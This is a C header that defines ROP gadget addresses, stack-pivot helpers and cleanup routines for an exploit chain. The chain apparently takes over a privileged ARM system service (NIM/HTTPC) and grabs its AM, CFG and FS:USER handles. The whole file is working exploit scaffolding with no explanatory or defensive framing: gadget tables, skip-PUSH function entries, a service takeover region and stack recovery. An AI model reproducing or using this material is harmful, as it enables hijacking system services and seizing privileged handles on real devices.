#pragma once

#include "rop_common.h"

#define ROP_GARBAGE                     (0xDEADBEEF)
#define ROP_STATICBUF_DESCINDEX0        (0x0017A384)
#define ROP_STATICBUF_DESCINDEX1        (0x00179A84)
#define ROP_STATICBUF_DESCINDEX2        (0x00178A84)
#define ROP_SAMPLEIPC_CMDBUF            (ROP_STATICBUF_DESCINDEX0)
#define ROP_SAMPLEIPC_CMDBUF_INDEX(x)   (ROP_SAMPLEIPC_CMDBUF + 4*(x))

// need this to get service reply and receives
#define ROP_NIMS_SESSION_HANDLE_ADDR    (0x00178A7C)

#define ROP_SERVICE_TAKEOVER_ADDR       (0x09000000)
#define ROP_SERVICE_TAKEOVER_SIZE       (0x4000)

#define ROP_BLXR1_MOVR0R4_POPR4PC       ROP_THUMBCODE(0x0014E1BC, 0)
#define ROP_MOVR0R4_POPR4PC             ROP_THUMBCODE(0x0014E1BC, 1)
#define ROP_POPPC                       ROP_THUMBCODE(0x00100066, 0)
#define ROP_POPR0PC                     ROP_ARMCODE  (0x0014FDE0, 2)
#define ROP_POPR1PC                     ROP_ARMCODE  (0x00127A58, 0)
#define ROP_POPR1R2R3PC                 ROP_THUMBCODE(0x00110B94, 0)
#define ROP_POPR4R5PC                   ROP_THUMBCODE(0x00101234, 0)
#define ROP_POPR4R5R6PC                 ROP_THUMBCODE(0x001000F4, 0)
#define ROP_POPR4R5R6R7PC               ROP_THUMBCODE(0x00105688, 0)
#define ROP_STR_R0TOR1_POPR4PC          ROP_THUMBCODE(0x0012E44E, 0)
#define ROP_LDR_R0FROMR0_POPR4PC        ROP_THUMBCODE(0x0014A664, 0)
#define ROP_STR_R4TOR2R0_POPR4PC        ROP_THUMBCODE(0x0012341A, 0)
#define ROP_LDR_R0FROMR0R6_BLXR1        ROP_THUMBCODE(0x00126B62, 0)
#define ROP_ADDR0_R4_STR_R0TOR3_POPR4PC ROP_THUMBCODE(0x00110376, 0)
#define ROP_ADDR0_0X5C_POPR4PC          ROP_THUMBCODE(0x0010FDF2, 0)
#define ROP_ADDR0_0X10_POPR4PC          ROP_THUMBCODE(0x0012FED2, 0)
#define ROP_ADDR0_0X4_POPR4PC           ROP_THUMBCODE(0x0012FEC6, 0)

// objects in stack for clean up, to perform a clean ROP
#define ROP_HTTPC_CONTEXT_OBJ           (0x001782C8)
#define ROP_LOCK_OBJ                    (0x00178470)

// functions
// some of these have instruction skips to hop over PUSH or some other harmful instructions to our ROP flow

// functions to used clean up objs in stack
#define ROP_NIMOBJ_CLEANUP_FUNC         ROP_THUMBCODE(0x0012B818, 0)
#define ROP_HTTPC_CONTEXT_CLOSE_POPR4PC ROP_THUMBCODE(0x0012C8B8, 2)
#define ROP_LOCK_UNLOCK_POPR4PC         ROP_THUMBCODE(0x00130F02, 1)
#define ROP_TLSOBJVAR_SET_FUNC          ROP_THUMBCODE(0x0012CFD0, 0)

#define ROP_MEMCPY_POPR0PC              ROP_ARMCODE  (0x0014FDE0, 1)
#define ROP_SVCCONTROLMEMORY_SKIPPUSH   ROP_ARMCODE  (0x0014ED04, 1)
#define ROP_SVCREPLYANDRECEIVE_SKIPPUSH ROP_ARMCODE  (0x0012FD54, 1)
#define ROP_SVCBREAK                    ROP_ARMCODE  (0x0014F044, 0)

// return *r0 == *r1
#define ROP_WORDPTRDERFS_CMP_BXLR       ROP_THUMBCODE(0x00130EF2, 0)

#define ROP_LMUL_POPPC                  ROP_ARMCODE  (0x0012F558, 1)

// (r0 & (0xFFFFFFFF << (32 - r2) >> (32 - r2 - r1))) >> r1
#define ROP_GET_R0_BIT_CHUNK_POPR4PC    ROP_THUMBCODE(0x0012FA74, 1)

#define ROP_GETFSUSER_HANDLE_POPR4PC    ROP_THUMBCODE(0x00130C8E, 0)
#define ROP_GETTLSADDR_ADD0X5C_POPR4PC  ROP_THUMBCODE(0x0010FDEC, 1)

// the addrs of the handles we want to grab a copy
#define ROP_AMNET_HANDLE_ADDR           (0x0015673C)
#define ROP_CFGS_HANDLE_ADDR            (0x00156750)
#define ROP_FSUSER_HANDLE_ADDR          (0x001566AC)

// stack pivoting and ptr setup
// addresses pointing to the pivot registers has to be offseted by 7 * 4
// due to ldmdb r0, {r1, r2, r3, ip, sp, lr, pc}
#define ROP_LDMBDR0_R1R2R3R12SPLRPC     ROP_ARMCODE  (0x00122B4C, 0)
#define ROP_STACK_PIVOT                 ROP_LDMBDR0_R1R2R3R12SPLRPC
#define ROP_STACK_PIVOTBUF_ADDR(x)      ((x) + 7 * 4)

// stack recovery
#define ROP_STACK_RECOVER_ADDR          (0x00178A34)
#define ROP_STACK_RECOVERY_PIVOTBUF     ROP_STATICBUF_DESCINDEX1
